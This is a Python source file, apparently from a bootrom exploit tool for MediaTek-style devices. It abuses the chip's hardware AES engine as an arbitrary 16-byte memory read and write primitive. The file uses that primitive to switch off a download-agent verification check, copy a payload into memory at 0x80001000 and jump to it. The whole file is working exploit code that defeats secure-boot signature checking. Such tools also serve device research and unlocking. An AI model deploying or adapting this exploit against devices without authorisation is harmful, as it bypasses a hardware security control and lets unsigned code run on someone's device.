import struct

from logger import log
from functions import load_payload_file
from common import CRYPTO_BASE


def init(dev):
    dev.write32(CRYPTO_BASE + 0x0C0C, 0)
    dev.write32(CRYPTO_BASE + 0x0C10, 0)
    dev.write32(CRYPTO_BASE + 0x0C14, 0)
    dev.write32(CRYPTO_BASE + 0x0C18, 0)
    dev.write32(CRYPTO_BASE + 0x0C1C, 0)
    dev.write32(CRYPTO_BASE + 0x0C20, 0)
    dev.write32(CRYPTO_BASE + 0x0C24, 0)
    dev.write32(CRYPTO_BASE + 0x0C28, 0)
    dev.write32(CRYPTO_BASE + 0x0C2C, 0)
    dev.write32(CRYPTO_BASE + 0x0C00 + 18 * 4, [0] * 4)
    dev.write32(CRYPTO_BASE + 0x0C00 + 22 * 4, [0] * 4)
    dev.write32(CRYPTO_BASE + 0x0C00 + 26 * 4, [0] * 8)


def hw_acquire(dev):
    dev.write32(0x10000164, (dev.read32(0x10000164) & 0xf8ffffff) | 0x1000000)
    dev.write32(CRYPTO_BASE, (dev.read32(CRYPTO_BASE) & 0xfffffff0) | 0xf)
    dev.write32(CRYPTO_BASE + 0x020, 0x885b)


def hw_release(dev):
    dev.write32(0x10000164, dev.read32(0x10000164) & 0xf8ffffff)
    dev.write32(CRYPTO_BASE, (dev.read32(CRYPTO_BASE) & 0xfffffff0) | 0xf)
    dev.write32(CRYPTO_BASE + 0x020, 0x885b)


def call_func(self, func):
    self.write32(CRYPTO_BASE + 0x0804, 3)
    self.write32(CRYPTO_BASE + 0x0808, 3)
    self.write32(CRYPTO_BASE + 0x0C00, func)
    self.write32(CRYPTO_BASE + 0x0400, 0)
    while not self.read32(CRYPTO_BASE + 0x0800):
        pass
    if self.read32(CRYPTO_BASE + 0x0800) & 2:
        if not (self.read32(CRYPTO_BASE + 0x0800) & 1):
            while not self.read32(CRYPTO_BASE + 0x0800):
                pass
        result = -1
        self.write32(CRYPTO_BASE + 0x0804, 3)
    else:
        while not (self.read32(CRYPTO_BASE + 0x0418) & 1):
            pass
        result = 0
        self.write32(CRYPTO_BASE + 0x0804, 3)
    return result


def aes_read16(dev, addr):
    dev.write32(CRYPTO_BASE + 0xC04, addr)
    dev.write32(CRYPTO_BASE + 0xC08, 0)  # dst to invalid pointer
    dev.write32(CRYPTO_BASE + 0xC0C, 1)
    dev.write32(CRYPTO_BASE + 0xC14, 18)
    dev.write32(CRYPTO_BASE + 0xC18, 26)
    dev.write32(CRYPTO_BASE + 0xC1C, 26)
    if call_func(dev, 126) != 0:  # aes decrypt
        raise Exception("failed to call the function!")
    words = dev.read32(CRYPTO_BASE + 0xC00 + 26 * 4, 4)  # read out of the IV
    data = b""
    for word in words:
        data += struct.pack("<I", word)
    return data


def aes_write16(dev, addr, data):
    if len(data) != 16:
        raise RuntimeError("data must be 16 bytes")

    pattern = bytes.fromhex("6c38d88958fd0cf51efd9debe8c265a5")

    # iv-xor
    words = []
    for x in range(4):
        word = data[x * 4:(x + 1) * 4]
        word = struct.unpack("<I", word)[0]
        pat = struct.unpack("<I", pattern[x * 4:(x + 1) * 4])[0]
        words.append(word ^ pat)

    dev.write32(CRYPTO_BASE + 0xC00 + 18 * 4, [0] * 4)
    dev.write32(CRYPTO_BASE + 0xC00 + 22 * 4, [0] * 4)
    dev.write32(CRYPTO_BASE + 0xC00 + 26 * 4, [0] * 8)

    dev.write32(CRYPTO_BASE + 0xC00 + 26 * 4, words)

    dev.write32(CRYPTO_BASE + 0xC04,
                0xD848)  # src to VALID address which has all zeroes (otherwise, update pattern)
    dev.write32(CRYPTO_BASE + 0xC08, addr)  # dst to our destination
    dev.write32(CRYPTO_BASE + 0xC0C, 1)
    dev.write32(CRYPTO_BASE + 0xC14, 18)
    dev.write32(CRYPTO_BASE + 0xC18, 26)
    dev.write32(CRYPTO_BASE + 0xC1C, 26)
    if call_func(dev, 126) != 0:  # aes decrypt
        raise RuntimeError("failed to call the function!")


def load_payload(dev, path):
    log("Init crypto engine")
    init(dev)
    hw_acquire(dev)
    init(dev)
    hw_acquire(dev)

    log("Disable DA verification check")
    addrs = [0x1201CDD4]
    for addr in addrs:
        dev.write32(addr, 0x1)

    payload = load_payload_file(path, 16)
    for i in range(0, len(payload), 16):
        aes_write16(dev, 0x80001000 + i, payload[i: i + 16])

    log("Let's rock")
    dev.jump_da(0x80001000)

    log("Wait for the payload to come online...")
    dev.wait_payload(b"\xB1\xB2\xB3\xB4")
    log("all good")